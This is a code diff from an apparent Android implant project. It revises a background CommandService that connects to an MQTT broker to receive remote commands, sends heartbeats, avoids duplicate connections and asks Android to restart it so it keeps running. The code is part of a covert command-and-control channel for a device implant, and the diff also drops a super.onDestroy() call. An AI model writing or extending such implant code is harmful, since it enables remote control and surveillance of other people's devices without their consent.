@@ -10,6 +10,7 @@ import com.cooperthecoder.implant.Config
 import com.cooperthecoder.implant.Networking
 import com.cooperthecoder.implant.data.DeviceProperties
 import org.eclipse.paho.android.service.MqttAndroidClient
+import org.eclipse.paho.client.mqttv3.IMqttToken
 import java.util.concurrent.TimeUnit
 
 class CommandService : Service() {
@@ -30,6 +31,18 @@ class CommandService : Service() {
         MqttAndroidClient(applicationContext, Config.MQTT_BROKER, clientId)
     }
 
+
+    val commandConnectionListener by lazy {
+        CommandConnectionListener(
+                DeviceProperties.identifier(this)
+        )
+    }
+    val commandMessageCallback by lazy {
+        CommandMessageCallback(client, applicationContext)
+    }
+
+    var connectedToken: IMqttToken? = null
+
     val mainHandler = Handler()
 
     val heartbeatTask: Runnable = Runnable {
@@ -47,26 +60,25 @@ class CommandService : Service() {
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
-        Log.d(TAG, "Connecting to MQTT broker")
-        openCommandChannel()
-        return START_NOT_STICKY
+        if (connectedToken == null) {
+            Log.d(TAG, "Connecting to MQTT broker")
+            connectedToken = openCommandChannel()
+        } else {
+            Log.d(TAG, "Client already connected to broker.")
+        }
+        return START_REDELIVER_INTENT
     }
 
     override fun onDestroy() {
         closeCommandChannel()
         Log.d(TAG, "Command listener stopped.")
-        super.onDestroy()
     }
 
-    private fun openCommandChannel() {
-        val commandConnectionListener = CommandConnectionListener(
-                client,
-                DeviceProperties.identifier(this)
-        )
-        val commandMessageCallback = CommandMessageCallback(client, applicationContext)
+    private fun openCommandChannel(): IMqttToken {
         client.setCallback(commandMessageCallback)
-        client.connect(null, commandConnectionListener)
+        val token = client.connect(null, commandConnectionListener)
         heartbeat()
+        return token
     }
 
     private fun heartbeat() {
@@ -75,7 +87,8 @@ class CommandService : Service() {
 
 
     private fun closeCommandChannel() {
-        client.close()
+        client.disconnect()
+        connectedToken = null
     }
 
     private fun onMeteredConnection() {
